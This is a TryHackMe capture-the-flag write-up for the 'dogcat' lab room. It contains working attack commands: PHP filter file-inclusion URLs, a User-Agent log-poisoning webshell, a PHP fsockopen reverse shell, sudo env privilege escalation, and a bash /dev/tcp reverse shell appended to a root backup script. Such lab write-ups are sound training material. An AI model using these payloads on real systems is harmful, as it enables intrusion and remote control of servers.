# TryHackMe — dogcat Writeup
**By:** Zytoona  
**Room:** [dogcat](https://tryhackme.com/room/dogcat)  
**Difficulty:** Medium  

---

## Recon

```bash
nmap -sV -sC <TARGET_IP>
```


---

## LFI — Source Code via PHP Filter

when i try cat../../../../../../
i have error 
from this error :
```
Warning: include(../../../../../var/www/html/index.php/dog.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening '../../../../../var/www/html/index.php/dog.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```
the function is
```
include $_GET['view'] . "php";
```
if you input a (cat) 
it add .php to input (be cat.php)


we have index.php in /var/www/html 

lets try to use it but without (.php) becuse function add it 

useing php filter ( php://filter/convert.base64-encode/resource= )
```
http://<TARGET_IP>/?view=php://filter/convert.base64-encode/resource=cat/../../../../../var/www/html/index
```


Decoded the Base64 output and found the vulnerable PHP source.
```
 <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>

   ```
we need to add   ext=  to url to avoid add .php  >   http://<TARGET_IP>/?view=php://filter/convert.base64-encode/resource=cat/../../../../../../etc/passwd&ext=

---

## Log Poisoning — RCE via User-Agent

Injected PHP webshell into Apache log using curl:

```bash
curl -H 'User-Agent: <?php system($_GET["cmd"]); ?>' http://<TARGET_IP>
```

Triggered it via LFI:

```bash
curl 'http://<TARGET_IP>/?view=cat../../../../../var/log/apache2/access.log&ext=&cmd=whoami'
```

---

## Reverse Shell

```bash
# listener
nc -lnvp 4444
```
i use this payload 
```
php -r '$sock=fsockopen("YOU-MACHINE-IP",PORT);exec("sh <&3 >&3 2>&3");’

URL-ENCODE

 php%20-r%20%27%24sock%3Dfsockopen%28%22<YOUR-MACHINE-IP>%22%2C<PORT>%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

```

```bash
# trigger via curl
curl 'http://<TARGET_IP>/?view=cat../../../../../var/log/apache2/access.log&ext=&cmd=<URL_ENCODED_REVSHELL>'
```

---


```
## Privilege Escalation

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/env

sudo env /bin/sh
```
---
## i make some local enumeration if found (.dockerenv) that mean i inside docker continer 

i can escap from it to host system

i found backup.sh and backup.tar in /opt/backups

backup.sh file do this 

```
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

This script runs as root and creates a backup archive of the /root/container directory. Since it’s executed by root, this offers a great opportunity for privilege escalation and potential container escape.

we will add reverse shell payload inside the script and start listener in our machine :

i use this payload 
```
echo "bash -i >&/dev/tcp/192.168.193.30/5555 0>&1" >> backup.sh
```
whit a minute 

and we will have root shell
